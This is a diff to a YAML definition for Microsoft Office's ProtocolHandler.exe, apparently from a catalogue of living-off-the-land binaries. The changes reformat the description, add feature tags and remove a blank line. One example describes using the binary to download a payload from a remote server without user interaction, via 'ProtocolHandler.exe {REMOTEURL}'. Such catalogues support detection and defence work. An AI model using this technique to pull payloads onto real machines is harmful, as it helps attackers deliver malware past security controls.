@@ -2,7 +2,10 @@
 id: windows-download-protocolhandler
 namespace: windows:download:protocolhandler
 name: protocolhandler
-description: 'Microsoft Office binary Located at: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\ProtocolHandler.exe; C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\ProtocolHandler.exe; C:\Program Files (x86)\Microsoft Office\Office16\ProtocolHandler.exe.'
+description: 'Microsoft Office binary Located at: C:\Program Files (x86)\Microsoft
+  Office 16\ClientX86\Root\Office16\ProtocolHandler.exe; C:\Program Files\Microsoft
+  Office 16\ClientX64\Root\Office16\ProtocolHandler.exe; C:\Program Files (x86)\Microsoft
+  Office\Office16\ProtocolHandler.exe.'
 author: Nir Chako
 version: 1.0.0
 capabilities:
@@ -41,7 +44,13 @@ resource_profile:
 allowed-tools:
 - protocolhandler
 parameters: []
-features: []
+features:
+- file-system
+- local
+- network-intensive
+- pipes-stdout
+- remote
+- requires-root
 execution:
   template: protocolhandler
   sandbox: execFile
@@ -49,7 +58,9 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Downloads payload from remote server (It will open the specified URL in the default web browser, which (if the URL points to a file) will often result in the file being downloaded to the user's Downloads folder (without user interaction))
+- description: Downloads payload from remote server (It will open the specified URL
+    in the default web browser, which (if the URL points to a file) will often result
+    in the file being downloaded to the user's Downloads folder (without user interaction))
   command: ProtocolHandler.exe {REMOTEURL}
 references: []
 techniques:
@@ -67,7 +78,6 @@ install:
   commands:
   - choco install protocolhandler
 ---
-
 
 # protocolhandler
 
